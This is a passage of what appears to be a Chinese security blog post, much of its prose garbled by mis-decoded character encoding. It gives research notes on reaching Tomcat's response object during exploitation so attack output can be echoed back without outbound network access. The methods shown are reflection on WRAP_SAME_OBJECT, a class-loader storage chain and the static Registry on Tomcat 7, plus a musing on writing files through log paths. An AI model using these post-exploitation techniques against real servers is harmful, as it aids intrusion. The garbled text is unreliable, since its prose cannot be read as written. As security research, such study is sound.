class="function"><span class="params">                                  ServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//å¦‚æœæœ‰è‡ªå®šä¹‰çš„Filterï¼Œä¼˜å…ˆæ‰§è¡Œ</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .....</span><br><span class="line">        <span class="comment">//è‹¥ApplicationDispatcher.WRAP_SAME_OBJECTä¸ºtrue</span></span><br><span class="line">        <span class="comment">//å°†requestå’Œresponseå¡å…¥é™æ€å˜é‡ä¸­</span></span><br><span class="line">        <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">            lastServicedRequest.set(request);</span><br><span class="line">            lastServicedResponse.set(response);</span><br><span class="line">        &#125;</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼ºç‚¹ï¼š</strong>ä½¿ç”¨Shiroè¿™ç§å¦å¤–èµ°è‡ªå®šä¹‰Filterçš„ã€‚å¦‚æœæ²¡ç»§ç»­ <code>chain.doFilter(request, response);</code>çš„æ“ä½œï¼Œå°±ä¼šè°ƒç”¨åˆ°<code>if (ApplicationDispatcher.WRAP_SAME_OBJECT)</code>è¯­å¥å—ã€‚</p><p><strong>æ“ä½œï¼š</strong></p><p>é€šè¿‡åå°„ä¿®æ”¹<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>ä¸º<code>true</code>ï¼Œå³å¯è®©Tomcatå°†requestå’Œresponseå­˜å…¥é™æ€å˜é‡<code>lastServicedRequest</code>ã€‚</p><p>è¿™é‡Œæœ‰ä¸ªå°å‘ï¼š<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>æ˜¯<code>final</code>ç±»å‹çš„ï¼Œæˆ‘ä»¬éœ€è¦å…ˆé€šè¿‡åå°„ï¼Œå°†å…¶<code>final</code>å±æ€§æŠ¹æ‰ï¼Œæ‰èƒ½æ­£å¸¸é€šè¿‡åå°„è®¾ç½®å€¼ã€‚å…³äºæŠ¹æ‰<code>final</code>å±æ€§çš„æ–‡åœ¨è¿™ <a href="https://glp2ex.yuque.com/glp2ex/pgf4ei/tl2o1w">åå°„ä¿®æ”¹finalå±æ€§</a></p><h2 id="å…¨å±€å­˜å‚¨"><a href="#å…¨å±€å­˜å‚¨" class="headerlink" title="å…¨å±€å­˜å‚¨"></a>å…¨å±€å­˜å‚¨</h2><p>ç›´æ¥ç”¨çš„è¯ï¼Œè·å–è·¯å¾„ä¸ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getContextClassLoader() -&gt; ParallelWebappClassLoader -&gt; StandardRoot -&gt; StandardContext -&gt; ApplicationContext -&gt; StandardService -&gt; Connector -&gt; Http11NioProtocol -&gt; AbstractProtocol$ConnectionHandler -&gt; RequestGroupInfo -&gt; RequestInfo -&gt; Request -&gt; Response</span><br></pre></td></tr></table></figure><p>ä»<code>Thread.currentThread().getContextClassLoader()</code>åˆ°<code>ApplicationContext</code>çš„é˜¶æ®µï¼Œéƒ½æ˜¯çº¿ç¨‹ç±»åŠ è½½å™¨å¤„ç†çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦å…³å¿ƒã€‚çœŸæ­£éœ€è¦å…³å¿ƒçš„æ˜¯<code>StandardService</code>ä¹‹åçš„ï¼Œæ˜¯å¦‚ä½•è·å–çš„ã€‚</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">åŸä½œè€…</a>çš„è¿™ç¯‡æ–‡ä¹ŸæŠŠä»–å¯»æ‰¾çš„æ€è·¯å†™å‡ºæ¥äº†ã€‚è®²çš„æŒºæ¸…æ¥šäº†ã€‚ä¸‹æ–‡éƒ½æ˜¯æˆ‘è·Ÿç€è°ƒæ—¶è®°çš„ç¬”è®°</p><p>æ€è·¯ï¼šæ‰¾åˆ°å­˜æ”¾<code>response</code>çš„ç±»ã€‚è·Ÿè°ƒç”¨æ ˆï¼Œçœ‹<strong>æœ€ç»ˆå­˜å‚¨</strong>åˆ°å“ªã€‚æœ€åç”¨çº¿ç¨‹ä¸Šä¸‹æ–‡åŠ è½½å™¨æ¥æ‹¿åˆ°è¿™ä¸ªç±»</p><p>æ‰¾åˆ°ä¸€ä¸ªå­˜æ”¾responseçš„ç±»ï¼š<code>Http11Processor</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Http11Processor.Response - åŸå› ï¼š<span class="keyword">final</span>ï¼Œä¸ä¼šè¢«ä¿®æ”¹</span><br></pre></td></tr></table></figure><p>å¼€Java Webé¡¹ç›®ï¼Œæ–­ç‚¹æ‰“åœ¨æ§åˆ¶å™¨ã€‚<strong>çœ‹è°ƒç”¨æ ˆ</strong>ã€‚åˆ›å»º<code>Http11Processor</code>çš„æ“ä½œå°±åœ¨<code>AbstractProtocol#process()</code></p><p>æ­¤æ—¶çš„æ€è·¯æ˜¯ï¼šå¯»æ‰¾å“ªé‡Œå­˜æ”¾äº†<code>Http11Processor</code>ã€‚</p><p>æ³¨æ„ï¼šæ‰¾å­˜å‚¨å˜é‡çš„æ“ä½œã€‚ä¸ä¸€å®šåœ¨è°ƒç”¨æ ˆå‰ï¼Œä¹Ÿä¸ä¸€å®šåœ¨è°ƒç”¨æ ˆåã€‚å‰åæˆ‘ä»¬éƒ½åº”è¯¥å»ç¿»ä¸€ç¿»ï¼Œçœ‹ä¸€çœ‹ã€‚</p><p>æœ€ä½³æ–¹å¼æ˜¯ï¼šæ‰¾åˆ°å˜é‡æœ€åˆçš„åˆ›å»ºç‚¹ï¼Œç„¶åé¡ºç€çœ‹ã€‚å¦‚æœå˜é‡æ˜¯å¯åŠ¨æ—¶åˆ›å»ºçš„ï¼Œé‚£å°±çœ‹åšå‚æ•°ä¼ å…¥å‡½æ•°æ—¶ï¼Œæœ‰æ— å¯¹å…¶è¿›è¡Œæ“ä½œã€‚è·Ÿçš„å¤ªæ·±ä¸è¦ç´§ï¼Œåšå¥½ç¬”è®°å°±å¥½äº†ã€‚</p><p><strong>Http11Processorçš„å­˜å‚¨</strong></p><p><em>AbstractProtocol#process</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (processor == <span class="keyword">null</span>) &#123;</span><br><span class="line">    processor = getProtocol().createProcessor();</span><br><span class="line">    register(processor); <span class="comment">//[!]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>[!]</code>ä½œç”¨ï¼š</strong></p><ul><li><p>å°†<code>processor</code>é‡Œçš„<code>RequestInfo request.reqProcessorMX</code>å¡å…¥**<code>RequestGroupInfo AbstractProtocol$ConnectionHandler.global</code>**</p></li><li><p><code>RequestInfo request.reqProcessorMX</code>å­˜åœ¨<code>org.apache.coyote.Request req</code>å­—æ®µã€‚é‡Œå¤´æœ‰<code>response</code></p></li></ul><p>æ—¢ç„¶<code>Http11Processor</code>è¢«å­˜å‚¨åˆ°<code>AbstractProtocol$ConnectionHandler.global</code>ä¸­ï¼Œæ¥ä¸‹æ¥å°±æ‰¾å“ªé‡Œå­˜æ”¾äº†<code>AbstractProtocol$ConnectionHandler</code>ã€‚è¿™æ˜¯ä¸€ä¸ªå†…éƒ¨ç±»ã€‚ä¸€èˆ¬éƒ½ä¼šè¢«å¤–é¢çš„ç±»çš„å±æ€§ä¿å­˜ã€‚</p><p>Tomcatä¸­ï¼Œ<code>AbstractProtocol</code>å­˜æ”¾å†…éƒ¨ç±»<code>ConnectionHandler</code>çš„å±æ€§æ˜¯<code>handler</code></p><p>æ‰€ä»¥æ¥ä¸‹æ¥çš„æ€è·¯æ˜¯ï¼Œæ‰¾<code>AbstractProtocol</code>çš„å­˜å‚¨ç‚¹ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ã€‚æ‰€ä»¥å¯»æ‰¾å­˜å‚¨ç‚¹æ—¶ï¼Œåº”è¯¥å¯»æ‰¾çš„æ˜¯å…¶å­ç±»ã€‚</p><p>ç»§æ‰¿å…³ç³»å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AbstractProtocol (org.apache.coyote)</span><br><span class="line">AbstractAjpProtocol (org.apache.coyote.ajp)</span><br><span class="line">AjpNioProtocol (org.apache.coyote.ajp)</span><br><span class="line">AjpAprProtocol (org.apache.coyote.ajp)</span><br><span class="line">AjpNio2Protocol (org.apache.coyote.ajp)</span><br><span class="line">AbstractHttp11Protocol (org.apache.coyote.http11)</span><br><span class="line">AbstractHttp11JsseProtocol (org.apache.coyote.http11)</span><br><span class="line">Http11AprProtocol (org.apache.coyote.http11)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æä¸€ä¸‹ï¼Œç”±äºåˆå¾ˆå¤šç±»å®ä¾‹æ˜¯åœ¨Tomcatå¯åŠ¨æ—¶ï¼Œå°±å·²ç»åˆå§‹åŒ–å¥½äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦æŒ ç ´è„‘å­æƒ³å˜é‡å“ªé‡Œè¢«åˆ›å»ºï¼Œå“ªé‡Œè¢«èµ‹å€¼ã€‚æˆ‘ä»¬ç›®çš„æ˜¯æ‰¾å­˜å‚¨ç‚¹ã€‚æ‰¾åˆ°å³å¯ï¼Œä¸ç„¶ä¼šè¶Šé™·è¶Šæ·±ã€‚</p><p><strong>Http11AprProtocolçš„å­˜å‚¨</strong></p><p>è·Ÿç€è°ƒç”¨æ ˆï¼ŒæŠ€å·§æ˜¯åªçœ‹Debugæ ä¸­çš„ç±»å±æ€§ã€‚å¦‚æœå±æ€§ä¸­æœ‰å­˜æ”¾æˆ‘ä»¬æƒ³æ‰¾çš„ç±»çš„å®ä¾‹ï¼Œå°±å»æ·±å…¥æ¢ç©¶ä¸‹å¤§æ¦‚çš„èµ‹å€¼é“¾ã€‚</p><p><em>AbstractProcessorLight#process</em> ä¸‹ä¸€ä¸ªè°ƒç”¨ç‚¹æ˜¯<em>Http11Processor#service</em>ã€‚è¿™æ˜¯processoré‡Œçš„æ–¹æ³•ã€‚</p><p><code>Http11Processor</code>æœ‰è¶£çš„å±æ€§å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">protocol = &#123;org.apache.coyote.http11.Http11NioProtocol@<span class="number">3161</span>&#125; </span><br><span class="line"> handler = &#123;org.apache.coyote.AbstractProtocol$ConnectionHandler@<span class="number">3153</span>&#125; </span><br><span class="line"></span><br><span class="line">inputBuffer = &#123;org.apache.coyote.http11.Http11InputBuffer@<span class="number">3731</span>&#125; </span><br><span class="line"> request = &#123;org.apache.coyote.Request@<span class="number">3728</span>&#125; </span><br><span class="line"></span><br><span class="line">outputBuffer = &#123;org.apache.coyote.http11.Http11OutputBuffer@<span class="number">3732</span>&#125; </span><br><span class="line"> response = &#123;org.apache.coyote.Response@<span class="number">3729</span>&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adapter = &#123;org.apache.catalina.connector.CoyoteAdapter&#125; </span><br><span class="line"> connector = &#123;org.apache.catalina.connector.Connector&#125;</span><br><span class="line">  protocolHandler = &#123;org.apache.coyote.http11.Http11NioProtocol&#125; </span><br><span class="line">  mserver = &#123;com.sun.jmx.mbeanserver.JmxMBeanServer&#125; </span><br><span class="line">  service = &#123;org.apache.catalina.core.StandardService&#125;</span><br><span class="line"></span><br><span class="line">userDataHelper = &#123;org.apache.tomcat.util.log.UserDataHelper@<span class="number">3730</span>&#125; </span><br><span class="line"> log = &#123;org.apache.juli.logging.DirectJDKLog@<span class="number">3267</span>&#125; </span><br><span class="line">  logger = &#123;java.util.logging.Logger@<span class="number">3798</span>&#125; </span><br><span class="line">   manager = &#123;ClassLoaderLogManager@<span class="number">3799</span>&#125; </span><br><span class="line">    &#123;ParallelWebappClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">    &#123;RLClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">    &#123;ParallelWebappClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">    &#123;Launcher$AppClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line"></span><br><span class="line">å…¥å‚æœ‰ä¸ª`socketWrapper`ï¼Œé‡Œå¤´æœ‰socketæ•°æ®ã€‚ä¸çŸ¥é“å¯ä¸å¯ä»¥åˆ©ç”¨</span><br><span class="line">å…¥å‚è¢«åŒ…è£¹è¿›`outputBuffer`äº†</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†æœ‰è¶£å±æ€§ï¼Œå°±å¾€è°ƒç”¨ç‚¹å‰/åå»æ‰¾ï¼Œæœ‰æ— é˜Ÿè¿™äº›å±æ€§è¿›è¡Œä¿å­˜ç­‰æ“ä½œ</p><p>åœ¨*CoyoteAdapter#service()*ä¸­ã€‚<code>connector.protocolHandler</code>å­˜æ”¾äº†ä¸Šæ–‡çš„protocolã€‚æœ€åTomcatå¯åŠ¨æ—¶ä¼šå°†<code>connector</code>æ”¾å…¥<code>StandardContext</code>ã€‚Tomcat8+å¯ä»¥é€šè¿‡currentThreadè·å–åˆ°<code>StandardContext</code></p><p>ps:</p><p><em>AbstractProcessor.response</em> ä¹Ÿæ˜¯response</p><h3 id="è®°ä¸ªæ²¡ç”¨ä¸œè¥¿"><a href="#è®°ä¸ªæ²¡ç”¨ä¸œè¥¿" class="headerlink" title="è®°ä¸ªæ²¡ç”¨ä¸œè¥¿"></a>è®°ä¸ªæ²¡ç”¨ä¸œè¥¿</h3><p>Tomcatå†™æ–‡ä»¶ã€‚ä¸çŸ¥é“è·¯å¾„çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨<code>org.apache.coyote.http11.Http11Protocol.log</code>ä¸‹çš„<code>logger.manager.classLoaderLoggers</code>ã€‚è¿™é‡Œæœ‰å¾ˆå¤šclassLoaderã€‚è¿˜ä¼šè®°å½•è·¯å¾„</p><p>Tomcat7 - 9ã€‚éƒ½å¯ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">org.apache.coyote.http11.Http11Protocol.log = &#123;org.apache.juli.logging.DirectJDKLog&#125; </span><br><span class="line"> logger = &#123;java.util.logging.Logger&#125; </span><br><span class="line">  manager = &#123;org.apache.juli.ClassLoaderLogManager&#125; </span><br><span class="line">   classLoaderLoggers = &#123;java.util.WeakHashMap&#125;  size = <span class="number">4</span></span><br><span class="line">     key = &#123;org.apache.catalina.loader.WebappClassLoader&#125; </span><br><span class="line">      antiJARLocking = <span class="keyword">false</span></span><br><span class="line">      resources = &#123;org.apache.naming.resources.ProxyDirContext&#125; </span><br><span class="line">       proxy = &#123;org.apache.naming.resources.ProxyDirContext&#125; </span><br><span class="line">       env = &#123;java.util.Hashtable&#125;  size = <span class="number">2</span></span><br><span class="line">       dirContext = &#123;org.apache.naming.resources.FileDirContext&#125; </span><br><span class="line">        base = &#123;java.io.File&#125; </span><br><span class="line">        absoluteBase = <span class="string">&quot;D:\ide\env\tomcat\apache-tomcat-7.0.8\webapps\manager&quot;</span> <span class="comment">//[!]</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">org.apache.coyote.http11.Http11Protocol.log = &#123;org.apache.juli.logging.DirectJDKLog&#125; </span><br><span class="line"> logger = &#123;java.util.logging.Logger&#125; </span><br><span class="line">  manager = &#123;org.apache.juli.ClassLoaderLogManager&#125; </span><br><span class="line">   classLoaderLoggers = &#123;java.util.WeakHashMap&#125;  size = <span class="number">4</span></span><br><span class="line">     key = &#123;org.apache.catalina.loader.StandardClassLoader&#125; </span><br><span class="line">     value = &#123;org.apache.juli.ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">      rootNode = &#123;org.apache.juli.ClassLoaderLogManager$LogNode&#125; </span><br><span class="line">       logger = &#123;org.apache.juli.ClassLoaderLogManager$RootLogger&#125; </span><br><span class="line">        manager = &#123;org.apache.juli.ClassLoaderLogManager&#125; </span><br><span class="line">        name = <span class="string">&quot;&quot;</span></span><br><span class="line">        handlers = &#123;java.util.concurrent.CopyOnWriteArrayList&#125;  size = <span class="number">2</span> <span class="comment">//[!]</span></span><br><span class="line">         <span class="number">0</span> = &#123;org.apache.juli.FileHandler&#125; </span><br><span class="line">          date = <span class="string">&quot;2021-12-09&quot;</span></span><br><span class="line">          directory = <span class="string">&quot;C:\Users\e\AppData\Local\JetBrains\IntelliJIdea2021.2\tomcat\2b72dbbd-2f54-48a6-9ed1-18ebe03347fa/logs&quot;</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å†™æ–‡ä»¶çš„æ–¹å¼ï¼Œå†™å…¥åˆ° ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>Adpteræ˜¯å¯åŠ¨æ—¶å°±å·²ç»è®¾ç½®å¥½äº†çš„</p><h2 id="Tomcat7-å¦ä¸€ä¸ªé™æ€å˜é‡"><a href="#Tomcat7-å¦ä¸€ä¸ªé™æ€å˜é‡" class="headerlink" title="* Tomcat7 å¦ä¸€ä¸ªé™æ€å˜é‡"></a>* Tomcat7 å¦ä¸€ä¸ªé™æ€å˜é‡</h2><p>æä¸‰å¸ˆå‚…æå‡ºæ¥çš„ã€‚åŸæ–‡ï¼š<a href="http://redteam.today/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/">tomcatä¸å‡ºç½‘å›æ˜¾è¿ç»­å‰§ç¬¬å…­é›†</a></p><p>è¿™ä¸ªç›¸å¯¹äºå…¨å±€å­˜å‚¨æ¥è¯´ï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½ç†è§£çš„å“ˆå“ˆå“ˆã€‚æ¯•ç«Ÿä¸€ä¸ªåå°„å…¨è§£å†³äº†ã€‚</p><p>Tomcatå¯¹<code>processor</code>è¿›è¡Œ<code>register()</code>çš„æ“ä½œå’ŒTomcat8ä¸å¤ªä¸€æ ·ã€‚å…·ä½“ä»£ç åœ¨<code>Http11Protocol#createProcessor()</code>ã€‚å…¶ä¸­æœ‰è°ƒç”¨ *Http11Protocol#register()*çš„æ“ä½œ</p><p>åœ¨*Http11Protocol#register()*ä¸­ã€‚æœ‰ä¸‹é¢è¿™ä¹ˆä¸€è¡Œã€‚å°†<code>rp</code>ä¸¢è¿›äº†<code>registerComponent()</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).registerComponent(rp, rpName, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„çœ‹åˆ°<code>Registry.getRegistry(null, null)</code>æ˜¯ä¸€ä¸ªé™æ€è°ƒç”¨ã€‚è·Ÿè¿›å»å¯ä»¥å‘ç°ã€‚å…¶è¿”å›çš„å°±æ˜¯<code>Registry.registry</code>é™æ€å±æ€§ã€‚</p><p>é‚£ï¼Œå¦‚æœæ¥ä¸‹æ¥çš„<code>registerComponent()</code>é€»è¾‘ä¸­æœ‰å°†<code>rp</code>å­˜å…¥<code>Registry.registry</code>æˆ–å…¶å¼•ç”¨çš„ç±»ä¸­ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡<code>Registry.getRegistry(null, null)</code>é™æ€è°ƒç”¨ï¼Œåœ¨Tomcatä»»æ„ä½ç½®å–åˆ°<code>response</code>äº†ã€‚ä¸‹é¢æˆ‘ä»¬è¦æ‰¾çš„æ˜¯åœ¨ä½•å¤„å­˜å‚¨äº†<code>rp</code>ã€‚</p><p>è·Ÿè¿›<code>registerComponent()</code>ï¼Œå¯ä»¥æ‰¾åˆ°å°†<code>RequestInfo rp</code>è®¾ç½®åˆ°é™æ€å˜é‡çš„ä»£ç ã€‚è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><p><em>å¯»æ‰¾å­˜å‚¨ç‚¹çš„æ€è·¯ï¼šé«˜äº®æ˜¾ç¤ºè¦è¢«çš„å˜é‡<code>rp</code>ï¼Œå‘ç°å“ªä¸ªæ–¹æ³•æœ‰ä¼ å…¥è¯¥å˜é‡ï¼Œè·Ÿè¿›åˆ†æ</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addMoiToTb:<span class="number">278</span>, Repository</span><br><span class="line">addMBean:<span class="number">440</span>, Repository</span><br><span class="line">registerWithRepository:<span class="number">1898</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerDynamicMBean:<span class="number">966</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerObject:<span class="number">900</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerMBean:<span class="number">324</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerMBean:<span class="number">522</span>, JmxMBeanServer</span><br><span class="line">registerComponent:<span class="number">749</span>, Registry</span><br><span class="line">register:<span class="number">272</span>, Http11Protocol$Http11ConnectionHandler</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆåœ¨*Repository#addMoiToTb()*è¿›è¡Œäº†å­˜å‚¨æ“ä½œã€‚å­˜å…¥çš„æ˜¯ä¸€ä¸ª<code>map</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addMoiToTb</span><span class="params">(<span class="keyword">final</span> DynamicMBean object,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> ObjectName name,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> String key,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> Map&lt;String,NamedObject&gt; moiTb,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> RegistrationContext context)</span> </span>&#123;</span><br><span class="line">    registering(context);</span><br><span class="line">    moiTb.put(key,<span class="keyword">new</span> NamedObject(name, object));<span class="comment">//å­˜å‚¨æ“ä½œ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å˜é‡å†…å®¹å¦‚ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ç”¨å¾ªç¯+åˆ¤æ–­ï¼Œè·å–<code>RequestGroupInfo</code>ç±»å‹çš„å…ƒç´ :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">moiTb = &#123;java.util.HashMap@<span class="number">2764</span>&#125;  size = <span class="number">37</span></span><br><span class="line"> <span class="string">&quot;name=&quot;</span>ajp-bio-<span class="number">8009</span><span class="string">&quot;,type=GlobalRequestProcessor&quot;</span></span><br><span class="line">  key = <span class="string">&quot;name=&quot;</span>ajp-bio-<span class="number">8009</span><span class="string">&quot;,type=GlobalRequestProcessor&quot;</span></span><br><span class="line">  value = &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">2822</span>&#125; </span><br><span class="line">   name = &#123;javax.management.ObjectName@<span class="number">2902</span>&#125; </span><br><span class="line">   object = &#123;org.apache.tomcat.util.modeler.BaseModelMBean@<span class="number">2903</span>&#125; </span><br><span class="line">    ....</span><br><span class="line">    resource = &#123;org.apache.coyote.RequestGroupInfo@<span class="number">2910</span>&#125;  <span class="comment">//å­˜åœ¨responseçš„ç±»å‹ä¸ºRequestGroupInfo</span></span><br><span class="line">    resourceType = <span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span></span><br><span class="line">    </span><br><span class="line"> <span class="string">&quot;type=StringCache&quot;</span> -&gt; &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">2824</span>&#125; </span><br><span class="line">  key = <span class="string">&quot;type=StringCache&quot;</span></span><br><span class="line">  value = &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">2824</span>&#125; </span><br><span class="line">   name = &#123;javax.management.ObjectName@<span class="number">2904</span>&#125; </span><br><span class="line">   object = &#123;org.apache.tomcat.util.modeler.BaseModelMBean@<span class="number">2905</span>&#125; </span><br><span class="line">.....</span><br><span class="line">    resource = &#123;org.apache.tomcat.util.buf.StringCache@<span class="number">2907</span>&#125; <span class="comment">//åˆ«çš„éƒ½æ˜¯å…¶ä»–ç±»å‹</span></span><br><span class="line">    resourceType = <span class="string">&quot;org.apache.tomcat.util.buf.StringCache&quot;</span></span><br></pre></td></tr></table></figure><p>è·å–<code>RequestGroupInfo</code>çš„å­˜å‚¨é“¾å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">org.apache.tomcat.util.modeler.Registry.registry</span><br><span class="line">-&gt; server</span><br><span class="line">    -&gt; mbsInterceptor</span><br><span class="line">    -&gt; repository</span><br><span class="line">    -&gt; domainTb</span><br><span class="line">    -&gt; <span class="string">&quot;Catalina&quot;</span></span><br><span class="line">    -&gt; <span class="string">&quot;name=\&quot;ajp-bio-8009\&quot;,type=GlobalRequestProcessor&quot;</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 